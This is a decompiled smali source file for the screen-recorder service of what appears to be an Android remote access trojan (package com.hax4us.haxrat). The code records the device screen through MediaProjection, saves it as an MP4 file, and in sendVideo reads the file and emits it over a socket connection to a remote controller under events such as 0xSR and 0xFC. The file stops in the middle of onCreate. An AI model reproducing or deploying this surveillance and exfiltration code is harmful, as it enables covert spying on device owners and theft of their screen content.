.class public final Lcom/hax4us/haxrat/ScreenRecorderService;
.super Landroid/app/Service;
.source "ScreenRecorderService.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/hax4us/haxrat/ScreenRecorderService$MyBroadcastReceiver;,
        Lcom/hax4us/haxrat/ScreenRecorderService$ServiceHandler;,
        Lcom/hax4us/haxrat/ScreenRecorderService$100000000;
    }
.end annotation


# static fields
.field private static final EXTRA_DATA:Ljava/lang/String; = "data"

.field private static final EXTRA_RESULT_CODE:Ljava/lang/String; = "resultcode"

.field private static final ONGOING_NOTIFICATION_ID:I = 0x17

.field private static final TAG:Ljava/lang/String; = "RECORDERSERVICE"

.field private static filePathAndName:Ljava/lang/String;


# instance fields
.field private cmd:Ljava/lang/String;

.field private data:Landroid/content/Intent;

.field public file:Ljava/io/File;

.field private mMediaProjection:Landroid/media/projection/MediaProjection;

.field private mMediaRecorder:Landroid/media/MediaRecorder;

.field private mScreenStateReceiver:Landroid/content/BroadcastReceiver;

.field private mServiceHandler:Lcom/hax4us/haxrat/ScreenRecorderService$ServiceHandler;

.field private mStopRecording:Ljava/util/TimerTask;

.field private mVirtualDisplay:Landroid/hardware/display/VirtualDisplay;

.field private resultCode:I


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 282
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method static synthetic access$1000015(Lcom/hax4us/haxrat/ScreenRecorderService;ILandroid/content/Intent;)V
    .locals 8

    move-object v0, p0

    move v1, p1

    move-object v2, p2

    move-object v5, v0

    move v6, v1

    move-object v7, v2

    invoke-direct {v5, v6, v7}, Lcom/hax4us/haxrat/ScreenRecorderService;->startRecording(ILandroid/content/Intent;)V

    return-void
.end method

.method static synthetic access$1000016(Lcom/hax4us/haxrat/ScreenRecorderService;)V
    .locals 4

    move-object v0, p0

    move-object v3, v0

    invoke-direct {v3}, Lcom/hax4us/haxrat/ScreenRecorderService;->stopRecording()V

    return-void
.end method

.method static synthetic access$L1000004(Lcom/hax4us/haxrat/ScreenRecorderService;)I
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget v3, v3, Lcom/hax4us/haxrat/ScreenRecorderService;->resultCode:I

    move v0, v3

    return v0
.end method

.method static synthetic access$L1000005(Lcom/hax4us/haxrat/ScreenRecorderService;)Landroid/content/Intent;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/hax4us/haxrat/ScreenRecorderService;->data:Landroid/content/Intent;

    move-object v0, v3

    return-object v0
.end method

.method static synthetic access$L1000006(Lcom/hax4us/haxrat/ScreenRecorderService;)Landroid/content/BroadcastReceiver;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/hax4us/haxrat/ScreenRecorderService;->mScreenStateReceiver:Landroid/content/BroadcastReceiver;

    move-object v0, v3

    return-object v0
.end method

.method static synthetic access$S1000004(Lcom/hax4us/haxrat/ScreenRecorderService;I)V
    .locals 6

    move-object v0, p0

    move v1, p1

    move-object v4, v0

    move v5, v1

    iput v5, v4, Lcom/hax4us/haxrat/ScreenRecorderService;->resultCode:I

    return-void
.end method

.method static synthetic access$S1000005(Lcom/hax4us/haxrat/ScreenRecorderService;Landroid/content/Intent;)V
    .locals 6

    move-object v0, p0

    move-object v1, p1

    move-object v4, v0

    move-object v5, v1

    iput-object v5, v4, Lcom/hax4us/haxrat/ScreenRecorderService;->data:Landroid/content/Intent;

    return-void
.end method

.method static synthetic access$S1000006(Lcom/hax4us/haxrat/ScreenRecorderService;Landroid/content/BroadcastReceiver;)V
    .locals 6

    move-object v0, p0

    move-object v1, p1

    move-object v4, v0

    move-object v5, v1

    iput-object v5, v4, Lcom/hax4us/haxrat/ScreenRecorderService;->mScreenStateReceiver:Landroid/content/BroadcastReceiver;

    return-void
.end method

.method static newIntent(Landroid/content/Context;ILandroid/content/Intent;)Landroid/content/Intent;
    .locals 15

    .prologue
    .line 72
    move-object v0, p0

    move/from16 v1, p1

    move-object/from16 v2, p2

    new-instance v7, Landroid/content/Intent;

    move-object v14, v7

    move-object v7, v14

    move-object v8, v14

    move-object v9, v0

    :try_start_0
    const-string v10, "com.hax4us.haxrat.ScreenRecorderService"

    invoke-static {v10}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v10

    invoke-direct {v8, v9, v10}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    move-object v4, v7

    .line 73
    move-object v7, v4

    const-string v8, "resultcode"

    move v9, v1

    invoke-virtual {v7, v8, v9}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object v7

    .line 74
    move-object v7, v4

    const-string v8, "data"

    move-object v9, v2

    invoke-virtual {v7, v8, v9}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    move-result-object v7

    .line 75
    move-object v7, v4

    move-object v0, v7

    return-object v0

    .line 72
    :catch_0
    move-exception v7

    move-object v5, v7

    new-instance v7, Ljava/lang/NoClassDefFoundError;

    move-object v14, v7

    move-object v7, v14

    move-object v8, v14

    move-object v9, v5

    invoke-virtual {v9}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v9

    invoke-direct {v8, v9}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v7
.end method

.method public static sendVideo(Ljava/lang/String;Ljava/lang/String;)V
    .locals 16
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            "Ljava/lang/String;",
            ")V"
        }
    .end annotation

    .prologue
    .line 241
    move-object/from16 v0, p0

    move-object/from16 v1, p1

    new-instance v9, Ljava/io/File;

    move-object v15, v9

    move-object v9, v15

    move-object v10, v15

    move-object v11, v1

    invoke-direct {v10, v11}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    move-object v3, v9

    .line 242
    move-object v9, v3

    invoke-virtual {v9}, Ljava/io/File;->length()J

    move-result-wide v9

    long-to-int v9, v9

    move v4, v9

    .line 243
    move v9, v4

    new-array v9, v9, [B

    move-object v5, v9

    .line 245
    :try_start_0
    new-instance v9, Ljava/io/BufferedInputStream;

    move-object v15, v9

    move-object v9, v15

    move-object v10, v15

    new-instance v11, Ljava/io/FileInputStream;

    move-object v15, v11

    move-object v11, v15

    move-object v12, v15

    move-object v13, v3

    invoke-direct {v12, v13}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v10, v11}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V

    move-object v6, v9

    .line 246
    move-object v9, v6

    move-object v10, v5

    const/4 v11, 0x0

    move-object v12, v5

    array-length v12, v12

    invoke-virtual {v9, v10, v11, v12}, Ljava/io/BufferedInputStream;->read([BII)I

    move-result v9

    .line 247
    new-instance v9, Lorg/json/JSONObject;

    move-object v15, v9

    move-object v9, v15

    move-object v10, v15

    invoke-direct {v10}, Lorg/json/JSONObject;-><init>()V

    move-object v7, v9

    .line 248
    move-object v9, v7

    const-string v10, "file"

    const/4 v11, 0x1

    invoke-virtual {v9, v10, v11}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    move-result-object v9

    .line 249
    move-object v9, v7

    const-string v10, "name"

    move-object v11, v3

    invoke-virtual {v11}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v9, v10, v11}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v9

    .line 250
    move-object v9, v7

    const-string v10, "buffer"

    move-object v11, v5

    invoke-virtual {v9, v10, v11}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v9

    .line 252
    move-object v9, v0

    const-string v10, "SR"

    if-ne v9, v10, :cond_1

    .line 253
    invoke-static {}, Lcom/hax4us/haxrat/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;

    move-result-object v9

    invoke-virtual {v9}, Lcom/hax4us/haxrat/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v9

    const-string v10, "0xSR"

    const/4 v11, 0x1

    new-array v11, v11, [Ljava/lang/Object;

    move-object v15, v11

    move-object v11, v15

    move-object v12, v15

    const/4 v13, 0x0

    move-object v14, v7

    aput-object v14, v12, v13

    invoke-virtual {v9, v10, v11}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v9

    .line 259
    :cond_0
    :goto_0
    move-object v9, v6

    invoke-virtual {v9}, Ljava/io/BufferedInputStream;->close()V

    .line 260
    const-string v9, "TAGG"

    new-instance v10, Ljava/lang/StringBuffer;

    move-object v15, v10

    move-object v10, v15

    move-object v11, v15

    invoke-direct {v11}, Ljava/lang/StringBuffer;-><init>()V

    const-string v11, "video sent "

    invoke-virtual {v10, v11}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v10

    move-object v11, v3

    invoke-virtual {v10, v11}, Ljava/lang/StringBuffer;->append(Ljava/lang/Object;)Ljava/lang/StringBuffer;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-static {v9, v10}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move-result v9

    .line 266
    :goto_1
    return-void

    .line 254
    :cond_1
    move-object v9, v0

    const-string v10, "RC"

    if-ne v9, v10, :cond_2

    .line 255
    invoke-static {}, Lcom/hax4us/haxrat/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;

    move-result-object v9

    invoke-virtual {v9}, Lcom/hax4us/haxrat/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v9

    const-string v10, "0xRC"

    const/4 v11, 0x1

    new-array v11, v11, [Ljava/lang/Object;

    move-object v15, v11

    move-object v11, v15

    move-object v12, v15

    const/4 v13, 0x0

    move-object v14, v7

    aput-object v14, v12, v13

    invoke-virtual {v9, v10, v11}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v9

    goto :goto_0

    .line 256
    :cond_2
    move-object v9, v0

    const-string v10, "FC"

    if-ne v9, v10, :cond_0

    .line 257
    invoke-static {}, Lcom/hax4us/haxrat/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;

    move-result-object v9

    invoke-virtual {v9}, Lcom/hax4us/haxrat/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v9

    const-string v10, "0xFC"

    const/4 v11, 0x1

    new-array v11, v11, [Ljava/lang/Object;

    move-object v15, v11

    move-object v11, v15

    move-object v12, v15

    const/4 v13, 0x0

    move-object v14, v7

    aput-object v14, v12, v13

    invoke-virtual {v9, v10, v11}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_2

    move-result-object v9

    goto :goto_0

    .line 260
    :catch_0
    move-exception v9

    move-object v6, v9

    .line 262
    move-object v9, v6

    invoke-virtual {v9}, Ljava/io/FileNotFoundException;->printStackTrace()V

    goto :goto_1

    :catch_1
    move-exception v9

    move-object v6, v9

    .line 264
    move-object v9, v6

    invoke-virtual {v9}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    :catch_2
    move-exception v9

    move-object v6, v9

    .line 266
    move-object v9, v6

    invoke-virtual {v9}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_1
.end method

.method private startRecording(ILandroid/content/Intent;)V
    .locals 30
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(I",
            "Landroid/content/Intent;",
            ")V"
        }
    .end annotation

    .prologue
    .line 182
    move-object/from16 v2, p0

    move/from16 v3, p1

    move-object/from16 v4, p2

    move-object/from16 v17, v2

    invoke-virtual/range {v17 .. v17}, Lcom/hax4us/haxrat/ScreenRecorderService;->getApplicationContext()Landroid/content/Context;

    move-result-object v17

    const-string v18, "media_projection"

    invoke-virtual/range {v17 .. v18}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v17

    check-cast v17, Landroid/media/projection/MediaProjectionManager;

    move-object/from16 v6, v17

    .line 183
    move-object/from16 v17, v2

    new-instance v18, Landroid/media/MediaRecorder;

    move-object/from16 v27, v18

    move-object/from16 v18, v27

    move-object/from16 v19, v27

    invoke-direct/range {v19 .. v19}, Landroid/media/MediaRecorder;-><init>()V

    move-object/from16 v0, v18

    move-object/from16 v1, v17

    iput-object v0, v1, Lcom/hax4us/haxrat/ScreenRecorderService;->mMediaRecorder:Landroid/media/MediaRecorder;

    .line 185
    new-instance v17, Landroid/util/DisplayMetrics;

    move-object/from16 v27, v17

    move-object/from16 v17, v27

    move-object/from16 v18, v27

    invoke-direct/range {v18 .. v18}, Landroid/util/DisplayMetrics;-><init>()V

    move-object/from16 v7, v17

    .line 186
    move-object/from16 v17, v2

    invoke-virtual/range {v17 .. v17}, Lcom/hax4us/haxrat/ScreenRecorderService;->getApplicationContext()Landroid/content/Context;

    move-result-object v17

    const-string v18, "window"

    invoke-virtual/range {v17 .. v18}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v17

    check-cast v17, Landroid/view/WindowManager;

    move-object/from16 v8, v17

    .line 187
    move-object/from16 v17, v8

    invoke-interface/range {v17 .. v17}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v17

    move-object/from16 v18, v7

    invoke-virtual/range {v17 .. v18}, Landroid/view/Display;->getRealMetrics(Landroid/util/DisplayMetrics;)V

    .line 189
    move-object/from16 v17, v7

    move-object/from16 v0, v17

    iget v0, v0, Landroid/util/DisplayMetrics;->densityDpi:I

    move/from16 v17, v0

    move/from16 v9, v17

    .line 190
    move-object/from16 v17, v7

    move-object/from16 v0, v17

    iget v0, v0, Landroid/util/DisplayMetrics;->widthPixels:I

    move/from16 v17, v0

    move/from16 v10, v17

    .line 191
    move-object/from16 v17, v7

    move-object/from16 v0, v17

    iget v0, v0, Landroid/util/DisplayMetrics;->heightPixels:I

    move/from16 v17, v0

    move/from16 v11, v17

    .line 193
    move-object/from16 v17, v2

    move-object/from16 v0, v17

    iget-object v0, v0, Lcom/hax4us/haxrat/ScreenRecorderService;->mMediaRecorder:Landroid/media/MediaRecorder;

    move-object/from16 v17, v0

    const/16 v18, 0x2

    invoke-virtual/range {v17 .. v18}, Landroid/media/MediaRecorder;->setVideoSource(I)V

    .line 194
    move-object/from16 v17, v2

    move-object/from16 v0, v17

    iget-object v0, v0, Lcom/hax4us/haxrat/ScreenRecorderService;->mMediaRecorder:Landroid/media/MediaRecorder;

    move-object/from16 v17, v0

    const/16 v18, 0x2

    invoke-virtual/range {v17 .. v18}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    .line 195
    move-object/from16 v17, v2

    move-object/from16 v0, v17

    iget-object v0, v0, Lcom/hax4us/haxrat/ScreenRecorderService;->mMediaRecorder:Landroid/media/MediaRecorder;

    move-object/from16 v17, v0

    const/16 v18, 0x2

    invoke-virtual/range {v17 .. v18}, Landroid/media/MediaRecorder;->setVideoEncoder(I)V

    .line 196
    move-object/from16 v17, v2

    move-object/from16 v0, v17

    iget-object v0, v0, Lcom/hax4us/haxrat/ScreenRecorderService;->mMediaRecorder:Landroid/media/MediaRecorder;

    move-object/from16 v17, v0

    const v18, 0x7a1200

    invoke-virtual/range {v17 .. v18}, Landroid/media/MediaRecorder;->setVideoEncodingBitRate(I)V

    .line 197
    move-object/from16 v17, v2

    move-object/from16 v0, v17

    iget-object v0, v0, Lcom/hax4us/haxrat/ScreenRecorderService;->mMediaRecorder:Landroid/media/MediaRecorder;

    move-object/from16 v17, v0

    const/16 v18, 0xf

    invoke-virtual/range {v17 .. v18}, Landroid/media/MediaRecorder;->setVideoFrameRate(I)V

    .line 198
    move-object/from16 v17, v2

    move-object/from16 v0, v17

    iget-object v0, v0, Lcom/hax4us/haxrat/ScreenRecorderService;->mMediaRecorder:Landroid/media/MediaRecorder;

    move-object/from16 v17, v0

    move/from16 v18, v10

    move/from16 v19, v11

    invoke-virtual/range {v17 .. v19}, Landroid/media/MediaRecorder;->setVideoSize(II)V

    .line 200
    sget-object v17, Landroid/os/Environment;->DIRECTORY_MOVIES:Ljava/lang/String;

    invoke-static/range {v17 .. v17}, Landroid/os/Environment;->getExternalStoragePublicDirectory(Ljava/lang/String;)Ljava/io/File;

    move-result-object v17

    invoke-virtual/range {v17 .. v17}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v17

    move-object/from16 v12, v17

    .line 201
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v17

    new-instance v19, Ljava/lang/Long;

    move-wide/from16 v27, v17

    move-object/from16 v29, v19

    move-object/from16 v17, v29

    move-wide/from16 v18, v27

    move-object/from16 v20, v29

    move-wide/from16 v27, v18

    move-object/from16 v29, v20

    move-object/from16 v18, v29

    move-wide/from16 v19, v27

    move-object/from16 v21, v29

    invoke-direct/range {v18 .. v20}, Ljava/lang/Long;-><init>(J)V

    move-object/from16 v13, v17

    .line 203
    const-string v17, "portrait"

    move-object/from16 v14, v17

    .line 204
    move/from16 v17, v10

    move/from16 v18, v11

    move/from16 v0, v17

    move/from16 v1, v18

    if-le v0, v1, :cond_0

    .line 205
    const-string v17, "landscape"

    move-object/from16 v14, v17

    .line 207
    :cond_0
    new-instance v17, Ljava/lang/StringBuffer;

    move-object/from16 v27, v17

    move-object/from16 v17, v27

    move-object/from16 v18, v27

    invoke-direct/range {v18 .. v18}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v18, Ljava/lang/StringBuffer;

    move-object/from16 v27, v18

    move-object/from16 v18, v27

    move-object/from16 v19, v27

    invoke-direct/range {v19 .. v19}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v19, Ljava/lang/StringBuffer;

    move-object/from16 v27, v19

    move-object/from16 v19, v27

    move-object/from16 v20, v27

    invoke-direct/range {v20 .. v20}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v20, Ljava/lang/StringBuffer;

    move-object/from16 v27, v20

    move-object/from16 v20, v27

    move-object/from16 v21, v27

    invoke-direct/range {v21 .. v21}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v21, Ljava/lang/StringBuffer;

    move-object/from16 v27, v21

    move-object/from16 v21, v27

    move-object/from16 v22, v27

    invoke-direct/range {v22 .. v22}, Ljava/lang/StringBuffer;-><init>()V

    move-object/from16 v22, v12

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v21

    const-string v22, "/time_"

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v21

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v20

    move-object/from16 v21, v13

    invoke-virtual/range {v21 .. v21}, Ljava/lang/Long;->toString()Ljava/lang/String;

    move-result-object v21

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v20

    invoke-virtual/range {v20 .. v20}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v20

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v19

    const-string v20, "_mode_"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v19

    invoke-virtual/range {v18 .. v19}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v18

    move-object/from16 v19, v14

    invoke-virtual/range {v18 .. v19}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v18

    invoke-virtual/range {v18 .. v18}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v18

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v17

    const-string v18, ".mp4"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v17

    invoke-virtual/range {v17 .. v17}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v17

    sput-object v17, Lcom/hax4us/haxrat/ScreenRecorderService;->filePathAndName:Ljava/lang/String;

    .line 208
    const-string v17, "TAGG"

    sget-object v18, Lcom/hax4us/haxrat/ScreenRecorderService;->filePathAndName:Ljava/lang/String;

    invoke-static/range {v17 .. v18}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move-result v17

    .line 209
    move-object/from16 v17, v2

    move-object/from16 v0, v17

    iget-object v0, v0, Lcom/hax4us/haxrat/ScreenRecorderService;->mMediaRecorder:Landroid/media/MediaRecorder;

    move-object/from16 v17, v0

    sget-object v18, Lcom/hax4us/haxrat/ScreenRecorderService;->filePathAndName:Ljava/lang/String;

    invoke-virtual/range {v17 .. v18}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    .line 210
    move-object/from16 v17, v2

    new-instance v18, Ljava/io/File;

    move-object/from16 v27, v18

    move-object/from16 v18, v27

    move-object/from16 v19, v27

    sget-object v20, Lcom/hax4us/haxrat/ScreenRecorderService;->filePathAndName:Ljava/lang/String;

    invoke-direct/range {v19 .. v20}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v18

    move-object/from16 v1, v17

    iput-object v0, v1, Lcom/hax4us/haxrat/ScreenRecorderService;->file:Ljava/io/File;

    .line 213
    move-object/from16 v17, v2

    :try_start_0
    move-object/from16 v0, v17

    iget-object v0, v0, Lcom/hax4us/haxrat/ScreenRecorderService;->mMediaRecorder:Landroid/media/MediaRecorder;

    move-object/from16 v17, v0

    invoke-virtual/range {v17 .. v17}, Landroid/media/MediaRecorder;->prepare()V
    :try_end_0
    .catch Ljava/lang/IllegalStateException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    .line 220
    :goto_0
    move-object/from16 v17, v2

    move-object/from16 v18, v6

    move/from16 v19, v3

    move-object/from16 v20, v4

    invoke-virtual/range {v18 .. v20}, Landroid/media/projection/MediaProjectionManager;->getMediaProjection(ILandroid/content/Intent;)Landroid/media/projection/MediaProjection;

    move-result-object v18

    move-object/from16 v0, v18

    move-object/from16 v1, v17

    iput-object v0, v1, Lcom/hax4us/haxrat/ScreenRecorderService;->mMediaProjection:Landroid/media/projection/MediaProjection;

    .line 221
    move-object/from16 v17, v2

    move-object/from16 v0, v17

    iget-object v0, v0, Lcom/hax4us/haxrat/ScreenRecorderService;->mMediaRecorder:Landroid/media/MediaRecorder;

    move-object/from16 v17, v0

    invoke-virtual/range {v17 .. v17}, Landroid/media/MediaRecorder;->getSurface()Landroid/view/Surface;

    move-result-object v17

    move-object/from16 v15, v17

    .line 222
    move-object/from16 v17, v2

    move-object/from16 v18, v2

    move-object/from16 v0, v18

    iget-object v0, v0, Lcom/hax4us/haxrat/ScreenRecorderService;->mMediaProjection:Landroid/media/projection/MediaProjection;

    move-object/from16 v18, v0

    const-string v19, "screenRec"

    move/from16 v20, v10

    move/from16 v21, v11

    move/from16 v22, v9

    const/16 v23, 0x2

    move-object/from16 v24, v15

    const/16 v25, 0x0

    check-cast v25, Landroid/hardware/display/VirtualDisplay$Callback;

    const/16 v26, 0x0

    check-cast v26, Landroid/os/Handler;

    invoke-virtual/range {v18 .. v26}, Landroid/media/projection/MediaProjection;->createVirtualDisplay(Ljava/lang/String;IIIILandroid/view/Surface;Landroid/hardware/display/VirtualDisplay$Callback;Landroid/os/Handler;)Landroid/hardware/display/VirtualDisplay;

    move-result-object v18

    move-object/from16 v0, v18

    move-object/from16 v1, v17

    iput-object v0, v1, Lcom/hax4us/haxrat/ScreenRecorderService;->mVirtualDisplay:Landroid/hardware/display/VirtualDisplay;

    .line 225
    move-object/from16 v17, v2

    move-object/from16 v0, v17

    iget-object v0, v0, Lcom/hax4us/haxrat/ScreenRecorderService;->mVirtualDisplay:Landroid/hardware/display/VirtualDisplay;

    move-object/from16 v17, v0

    if-nez v17, :cond_1

    .line 226
    const-string v17, "TAGG"

    const-string v18, "vdisplay is null"

    invoke-static/range {v17 .. v18}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move-result v17

    .line 227
    :cond_1
    move-object/from16 v17, v2

    move-object/from16 v0, v17

    iget-object v0, v0, Lcom/hax4us/haxrat/ScreenRecorderService;->mMediaRecorder:Landroid/media/MediaRecorder;

    move-object/from16 v17, v0

    invoke-virtual/range {v17 .. v17}, Landroid/media/MediaRecorder;->start()V

    .line 229
    const-string v17, "TAGG"

    const-string v18, "Started recording"

    invoke-static/range {v17 .. v18}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    move-result v17

    return-void

    .line 213
    :catch_0
    move-exception v17

    move-object/from16 v15, v17

    .line 215
    move-object/from16 v17, v15

    invoke-virtual/range {v17 .. v17}, Ljava/lang/IllegalStateException;->printStackTrace()V

    goto :goto_0

    :catch_1
    move-exception v17

    move-object/from16 v15, v17

    .line 217
    move-object/from16 v17, v15

    invoke-virtual/range {v17 .. v17}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0
.end method

.method private stopRecording()V
    .locals 3
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 233
    move-object v0, p0

    move-object v2, v0

    iget-object v2, v2, Lcom/hax4us/haxrat/ScreenRecorderService;->mMediaRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v2}, Landroid/media/MediaRecorder;->stop()V

    .line 234
    move-object v2, v0

    iget-object v2, v2, Lcom/hax4us/haxrat/ScreenRecorderService;->mMediaProjection:Landroid/media/projection/MediaProjection;

    invoke-virtual {v2}, Landroid/media/projection/MediaProjection;->stop()V

    .line 235
    move-object v2, v0

    iget-object v2, v2, Lcom/hax4us/haxrat/ScreenRecorderService;->mMediaRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v2}, Landroid/media/MediaRecorder;->release()V

    .line 236
    move-object v2, v0

    iget-object v2, v2, Lcom/hax4us/haxrat/ScreenRecorderService;->mVirtualDisplay:Landroid/hardware/display/VirtualDisplay;

    invoke-virtual {v2}, Landroid/hardware/display/VirtualDisplay;->release()V

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 4
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 273
    move-object v0, p0

    move-object v1, p1

    const/4 v3, 0x0

    check-cast v3, Landroid/os/IBinder;

    move-object v0, v3

    return-object v0
.end method

.method public onCreate()V
    .locals 12
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    move-object v0, p0

    move-object v6, v0

    const-string v7, "com.aide.ui"

    invoke-static {v6, v7}, Ladrt/ADRTLogCatReader;->onContext(Landroid/content/Context;Ljava/lang/String;)V

    .line 131
    move-object v6, v0

    new-instance v7, Lcom/hax4us/haxrat/ScreenRecorderService$MyBroadcastReceiver;

    move-object v11, v7

    move-object v7, v11

    move-object v8, v11

    move-object v9, v0

    invoke-direct {v8, v9}, Lcom/hax4us/haxrat/ScreenRecorderService$MyBroadcastReceiver;-><init>(Lcom/hax4us/haxrat/ScreenRecorderService;)V

    iput-object v7, v6, Lcom/hax4us/haxrat/ScreenRecorderService;->mScreenStateReceiver:Landroid/content/BroadcastReceiver;

    .line 132
    new-instance v6, Landroid/content/IntentFilter;

    move-object v11, v6

    move-object v6, v11

    move-object v7, v11

    invoke-direct {v7}, Landroid/content/IntentFilter;-><init>()V

    move-object v2, v6

    .line 133
    move-object v6, v2

    const-string v7, "android.intent.action.SCREEN_ON"

    invoke-virtual {v6, v7}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 134
    move-object v6, v2

    const-string v7, "android.intent.action.SCREEN_OFF"

    invoke-virtual {v6, v7}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 135
    move-object v6, v2

    const-string v7, "android.intent.action.CONFIGURATION_CHANGED"

    invoke-virtual {v6, v7}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 136
    move-object v6, v0

    move-object v7, v0

    iget-object v7, v7, Lcom/hax4us/haxrat/ScreenRecorderService;->mScreenStateReceiver:Landroid/content/BroadcastReceiver;

    move-object v8, v2

